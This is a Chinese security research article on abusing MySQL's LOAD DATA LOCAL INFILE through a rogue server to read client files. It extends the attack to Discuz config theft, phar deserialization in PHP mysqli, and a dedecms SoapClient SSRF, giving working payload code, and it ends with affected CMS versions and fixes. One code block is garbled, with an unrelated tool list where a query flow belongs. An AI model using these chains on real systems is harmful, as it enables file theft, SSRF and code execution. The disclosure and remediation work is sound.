> 原文链接: https://www.anquanke.com//post/id/197518 


# CSS-T | Mysql Client 任意文件读取攻击链拓展


                                阅读量   
                                **1243982**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t013922c85f246dc4bc.png)](https://p2.ssl.qhimg.com/t013922c85f246dc4bc.png)



> 这应该是一个很早以前就爆出来的漏洞，而我见到的时候是在TCTF2018 final线下赛的比赛中，是被 Dragon Sector 和 Cykor 用来非预期h4x0r’s club这题的一个技巧。[http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)在后来的研究中，和@Dawu的讨论中顿时觉得这应该是一个很有趣的trick，在逐渐追溯这个漏洞的过去的过程中，我渐渐发现这个问题作为mysql的一份feature存在了很多年，从13年就有人分享这个问题。
<ul>
- [Database Honeypot by design (2013 8月 Presentation from Yuri Goltsev)](https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927)
- [Rogue-MySql-Server Tool (2013年 9月 MySQL fake server to read files of connected clients)](https://github.com/Gifts/Rogue-MySql-Server)
- [Abusing MySQL LOCAL INFILE to read client files (2018年4月23日)](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html)
</ul>
在围绕这个漏洞的挖掘过程中，我们不断地发现新的利用方式，所以将其中大部分的发现都总结并准备了议题在CSS上分享，下面让我们来一步步分析。



## Load data infile

load data infile是一个很特别的语法，熟悉注入或者经常打CTF的朋友可能会对这个语法比较熟悉，在CTF中，我们经常能遇到没办法load_file读取文件的情况，这时候唯一有可能读到文件的就是load data infile，一般我们常用的语句是这样的：

```
load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```

mysql server会读取服务端的/etc/passwd然后将数据按照’\n’分割插入表中，但现在这个语句同样要求你有FILE权限，以及非local加载的语句也受到secure_file_priv的限制

```
mysql&gt; load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

如果我们修改一下语句，加入一个关键字local。

```
mysql&gt; load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
Query OK, 11 rows affected, 11 warnings (0.01 sec)
Records: 11  Deleted: 0  Skipped: 0  Warnings: 11
```

加了local之后，这个语句就成了，读取客户端的文件发送到服务端，上面那个语句执行结果如下

[![](https://p1.ssl.qhimg.com/t012a3689651d7109c3.png)](https://p1.ssl.qhimg.com/t012a3689651d7109c3.png)

很显然，这个语句是不安全的，在mysql的文档里也充分说明了这一点

[https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html)

在mysql文档中的说到，服务端可以要求客户端读取有可读权限的任何文件。

mysql认为客户端不应该连接到不可信的服务端。

[![](https://p1.ssl.qhimg.com/t01bbe18005e62d341a.png)](https://p1.ssl.qhimg.com/t01bbe18005e62d341a.png)

我们今天的这个问题，就是围绕这个基础展开的。



## 构造恶意服务端

在思考明白了前面的问题之后，核心问题就成了，我们怎么构造一个恶意的mysql服务端。

在搞清楚这个问题之前，我们需要研究一下mysql正常执行链接和查询的数据包结构。

1、greeting包，服务端返回了banner，其中包含mysql的版本

[![](https://p0.ssl.qhimg.com/t01fb3f8ba4a1cb21a6.png)](https://p0.ssl.qhimg.com/t01fb3f8ba4a1cb21a6.png)

2、客户端登录请求

[![](https://p5.ssl.qhimg.com/t012964ef3cd7987e4e.png)](https://p5.ssl.qhimg.com/t012964ef3cd7987e4e.png)

3、然后是初始化查询，这里因为是phpmyadmin所以初始化查询比较多

[![](https://p2.ssl.qhimg.com/t0191608241b70de5b0.png)](https://p2.ssl.qhimg.com/t0191608241b70de5b0.png)

4、load file local

由于我的环境在windows下，所以这里读取为C:/Windows/win.ini，语句如下

```
load data local infile "C:/Windows/win.ini" into table test FIELDS TERMINATED BY '\n';
```

首先是客户端发送查询

[![](https://p1.ssl.qhimg.com/t0157cc9341f0ae4a25.png)](https://p1.ssl.qhimg.com/t0157cc9341f0ae4a25.png)

然后服务端返回了需要的路径

[![](https://p2.ssl.qhimg.com/t01f28550cb28464c0a.png)](https://p2.ssl.qhimg.com/t01f28550cb28464c0a.png)

[![](https://p5.ssl.qhimg.com/t011f38e54e13130ef8.png)](https://p5.ssl.qhimg.com/t011f38e54e13130ef8.png)

然后客户端直接把内容发送到了服务端

[![](https://p3.ssl.qhimg.com/t01d17dc93eb01267ad.png)](https://p3.ssl.qhimg.com/t01d17dc93eb01267ad.png)

[![](https://p4.ssl.qhimg.com/t01b149efb9222e84b8.png)](https://p4.ssl.qhimg.com/t01b149efb9222e84b8.png)

看起来流程非常清楚，而且客户端读取文件的路径并不是从客户端指定的，而是发送到服务端，服务端制定的。

原本的查询流程为

```
- Advanced CFO Solutions MySQL Query failed
- SeekWell failed
- Skyvia Query Gallery failed
- database Borwser failed
- Kloudio pwned
```

## 演示
- mysql client (pwned)
- php mysqli (pwned，fixed by 7.3.4)
- php pdo (默认禁用)
- python MySQLdb (pwned)
- python mysqlclient (pwned)
- java JDBC Driver (pwned，部分条件下默认禁用)
- navicat （pwned)- 腾讯云 DTS 失败，禁用Load data local
- 阿里云 RDS 数据迁移失败，禁用Load data local
- 华为云 RDS DRS服务 成功- 金山云 RDS DTS数据迁移 成功- Google could SQL数据库迁移失败，禁用Load data infile
- AWS RDS DMS服务 成功
## [![](https://p5.ssl.qhimg.com/t01a65129785c9a9148.png)](https://p5.ssl.qhimg.com/t01a65129785c9a9148.png)

### 拓展？2RCE！

抛开我们前面提的一些很特殊的场景下，我们也要讨论一些这个漏洞在通用场景下的利用攻击链。

既然是围绕任意文件读取来讨论，那么最能直接想到的一定是有关配置文件的泄露所导致的漏洞了。

任意文件读 with 配置文件泄露在Discuz x3.4的配置中存在这样两个文件

```
config/config_ucenter.php
config/config_global.php
```

在dz的后台，有一个ucenter的设置功能，这个功能中提供了ucenter的数据库服务器配置功能，通过配置数据库链接恶意服务器，可以实现任意文件读取获取配置信息。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01640c2c28715cb024.png)

配置ucenter的访问地址。

```
原地址： http://localhost:8086/upload/uc_server
修改为： http://localhost:8086/upload/uc_server\');phpinfo();//
```

当我们获得了authkey之后，我们可以通过admin的uid以及盐来计算admin的cookie。然后用admin的cookie以及UC_KEY来访问即可生效

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0130b4e2a98dea8039.png)

任意文件读 to 反序列化2018年BlackHat大会上的Sam Thomas分享的File Operation Induced Unserialization via the “phar://” Stream Wrapper议题，原文[https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf ](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)。

在该议题中提到，在PHP中存在一个叫做[Stream API](https://secure.php.net/manual/zh/internals2.ze1.streams.php)，通过注册拓展可以注册相应的伪协议，而phar这个拓展就注册了phar://这个stream wrapper。

在我们知道创宇404实验室安全研究员seaii曾经的研究([https://paper.seebug.org/680/](https://paper.seebug.org/680/))中表示，所有的文件函数都支持stream wrapper。

深入到函数中，我们可以发现，可以支持steam wrapper的原因是调用了

```
stream = php_stream_open_wrapper_ex(filename, "rb" ....);
```

从这里，我们再回到mysql的load file local语句中，在mysqli中，mysql的读文件是通过php的函数实现的

```
https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L43-L52

if (PG(open_basedir)) `{`
        if (php_check_open_basedir_ex(filename, 0) == -1) `{`
            strcpy(info-&gt;error_msg, "open_basedir restriction in effect. Unable to open file");
            info-&gt;error_no = CR_UNKNOWN_ERROR;
            DBG_RETURN(1);
        `}`
    `}`

    info-&gt;filename = filename;
    info-&gt;fd = php_stream_open_wrapper_ex((char *)filename, "r", 0, NULL, context);
```

也同样调用了php_stream_open_wrapper_ex函数，也就是说，我们同样可以通过读取phar文件来触发反序列化。

### 复现

首先需要一个生成一个phar

```
pphar.php

&lt;?php
class A `{`
    public $s = '';
    public function __wakeup () `{`
        echo "pwned!!";
    `}`
`}`


@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar-&gt;startBuffering();
$phar-&gt;setStub("GIF89a "."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub
$o = new A();
$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();
?&gt;
```

使用该文件生成一个phar.phar

然后我们模拟一次查询

```
test.php

&lt;?php
class A `{`
    public $s = '';
    public function __wakeup () `{`
        echo "pwned!!";
    `}`
`}`


$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, '`{`evil_mysql_ip`}`', 'root', '123456', 'test', 3667);
$p = mysqli_query($m, 'select 1;');

// file_get_contents('phar://./phar.phar');
```

图中我们只做了select 1查询，但我们伪造的evil mysql server中驱使mysql client去做load file local查询，读取了本地的

```
phar://./phar.phar
```

成功触发反序列化[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0173950dfe2372d23c.png)

### 反序列化 to RCE

当一个反序列化漏洞出现的时候，我们就需要从源代码中去寻找合适的pop链，建立在pop链的利用基础上，我们可以进一步的扩大反序列化漏洞的危害。

php序列化中常见的魔术方法有以下 – 当对象被创建的时候调用：construct – 当对象被销毁的时候调用：destruct – 当对象被当作一个字符串使用时候调用：toString – 序列化对象之前就调用此方法(其返回需要是一个数组)：sleep – 反序列化恢复对象之前就调用此方法：wakeup – 当调用对象中不存在的方法会自动调用此方法：call

配合与之相应的pop链，我们就可以把反序列化转化为RCE。

### dedecms 后台反序列化漏洞 to SSRF

dedecms 后台，模块管理，安装UCenter模块。开始配置[![](https://p2.ssl.qhimg.com/t012a6800b2249fb1c1.png)](https://p2.ssl.qhimg.com/t012a6800b2249fb1c1.png)

首先需要找一个确定的UCenter服务端，可以通过找一个dz的站来做服务端。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2020/01/f55a7398-56ff-486c-ac04-176fa2f605cf.png-w331s)[![](https://p3.ssl.qhimg.com/t01ff289e2f4710db4d.png)](https://p3.ssl.qhimg.com/t01ff289e2f4710db4d.png)

然后就会触发任意文件读取，当然，如果读取文件为phar，则会触发反序列化。

我们需要先生成相应的phar

```
&lt;?php

class Control
`{`
    var $tpl;
    // $a = new SoapClient(null,array('uri'=&gt;'http://example.com:5555', 'location'=&gt;'http://example.com:5555/aaa'));
    public $dsql;

    function __construct()`{`
        $this-&gt;dsql = new SoapClient(null,array('uri'=&gt;'http://xxxx:5555', 'location'=&gt;'http://xxxx:5555/aaa'));
    `}`

    function __destruct() `{`
        unset($this-&gt;tpl);
        $this-&gt;dsql-&gt;Close(TRUE);
    `}`
`}`

@unlink("dedecms.phar");
$phar = new Phar("dedecms.phar");
$phar-&gt;startBuffering();
$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub，增加gif文件头
$o = new Control();
$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();

?&gt;
```

然后我们可以直接通过前台上传头像来传文件，或者直接后台也有文件上传接口，然后将rogue mysql server来读取这个文件

```
phar://./dedecms.phar/test.txt
```

监听5555可以收到

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2020/01/e95504be-605c-4b56-a4b1-6cf2ec62b4cf.png-w331s)[![](https://p2.ssl.qhimg.com/t0191c34395d952a2b5.png)](https://p2.ssl.qhimg.com/t0191c34395d952a2b5.png)

ssrf进一步可以攻击redis等拓展攻击面，就不多说了。

部分CMS测试结果

|CMS名|影响版本|是否存在mysql任意文件读取|是否有可控的MySQL服务器设置|是否有可控的反序列化|是否可上传phar|补丁
|------
|phpmyadmin|&lt; 4.8.5|是|是|是|是|[补丁](https://github.com/phpmyadmin/phpmyadmin/commit/828f740158e7bf14aa4a7473c5968d06364e03a2)
|Dz|未修复|是|是|否|None|None
|drupal|None|否(使用PDO)|否(安装)|是|是|None
|dedecms|None|是|是(ucenter)|是(ssrf)|是|None
|ecshop|None|是|是|否|是|None
|禅道|None|否(PDO)|否|None|None|None
|phpcms|None|是|是|是(ssrf)|是|None
|帝国cms|None|是|是|否|None|None
|phpwind|None|否(PDO)|是|None|None|None
|mediawiki|None|是|否（后台没有修改mysql配置的方法）|是|是|None
|Z-Blog|None|是|否（后台没有修改mysql配置的方法）|是|是|None



## 修复方式

对于大多数mysql的客户端来说，load file local是一个无用的语句，他的使用场景大多是用于传输数据或者上传数据等。对于客户端来说，可以直接关闭这个功能，并不会影响到正常的使用。

具体的关闭方式见文档 – [https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html)

对于不同服务端来说，这个配置都有不同的关法，对于JDBC来说，这个配置叫做allowLoadLocalInfile
- [https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html](https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html)
在php的mysqli和mysql两种链接方式中，底层代码直接决定了这个配置。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2020/01/8544581b-1f88-439a-b631-fc557ab7b4d2.png-w331s)[![](https://p2.ssl.qhimg.com/t01555d1358fc4b695b.png)](https://p2.ssl.qhimg.com/t01555d1358fc4b695b.png)

这个配置是PHP_INI_SYSTEM，在php的文档中，这个配置意味着Entry can be set in php.ini or httpd.conf。

所以只有在php.ini中修改mysqli.allow_local_infile = Off就可以修复了。

在php7.3.4的更新中，mysqli中这个配置也被默认修改为关闭

[https://github.com/php/php-src/commit/2eaabf06fc5a62104ecb597830b2852d71b0a111#diff-904fc143c31bb7dba64d1f37ce14a0f5](https://github.com/php/php-src/commit/2eaabf06fc5a62104ecb597830b2852d71b0a111#diff-904fc143c31bb7dba64d1f37ce14a0f5)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2020/01/cfe7f0b5-da1c-459e-beaa-31d812320232.png-w331s)[![](https://p2.ssl.qhimg.com/t01e22c2b9b9c13fdcb.png)](https://p2.ssl.qhimg.com/t01e22c2b9b9c13fdcb.png)

可惜在不再更新的旧版本mysql5.6中，无论是mysql还是mysqli默认都为开启状态。

现在的代码中也可以通过mysqli_option，在链接前配置这个选项。

[http://php.net/manual/zh/mysqli.options.php](http://php.net/manual/zh/mysqli.options.php)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d98e81c32128b57e.png)

比较有趣的是，通过这种方式修复，虽然禁用了allow_local_infile，但是如果使用wireshark抓包却发现allow_local_infile仍是启动的（但是无效）。

在旧版本的phpmyadmin中，先执行了mysqli_real_connect，然后设置mysql_option，这样一来allow_local_infile实际上被禁用了，但是在发起链接请求时中allow_local_infile还没有被禁用。

实际上是因为mysqli_real_connect在执行的时候，会初始化allow_local_infile。在php代码底层mysqli_real_connect实际是执行了mysqli_common_connect。而在mysqli_common_connect的代码中，设置了一次allow_local_infile。

[https://github.com/php/php-src/blob/ca8e2abb8e21b65a762815504d1fb3f20b7b45bc/ext/mysqli/mysqli_nonapi.c#L251](https://github.com/php/php-src/blob/ca8e2abb8e21b65a762815504d1fb3f20b7b45bc/ext/mysqli/mysqli_nonapi.c#L251)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2020/01/c933d3c8-6f70-4622-b898-8d21d0a17bba.png-w331s)[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01865a2451398612c1.png)

如果在mysqli_real_connect之前设置mysql_option，其allow_local_infile的配置会被覆盖重写，其修改就会无效。

phpmyadmin在1月22日也正是通过交换两个函数的相对位置来修复了该漏洞。[https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f](https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f)



## 说在最后

这是一个针对mysql feature的攻击模式，思路非常有趣，就目前而言在mysql层面没法修复，只有在客户端关闭了这个配置才能避免印象。虽然作为攻击面并不是很广泛，但可能针对一些特殊场景的时候，可以特别有效的将一个正常的功能转化为任意文件读取，在拓展攻击面上非常的有效。

详细的攻击场景这里就不做假设了，危害还是比较大的。



## REF
- [http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)
- [https://lightless.me/archives/read-mysql-client-file.html](https://lightless.me/archives/read-mysql-client-file.html)
- [https://dev.mysql.com/doc/refman/8.0/en/load-data.html](https://dev.mysql.com/doc/refman/8.0/en/load-data.html)
- [https://dev.mysql.com/doc/refman/8.0/en/load-data.html](https://dev.mysql.com/doc/refman/8.0/en/load-data.html)
[![](https://p1.ssl.qhimg.com/t01507cccd8cd1336b7.png)](https://p1.ssl.qhimg.com/t01507cccd8cd1336b7.png)

本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1112/](https://paper.seebug.org/1112/)
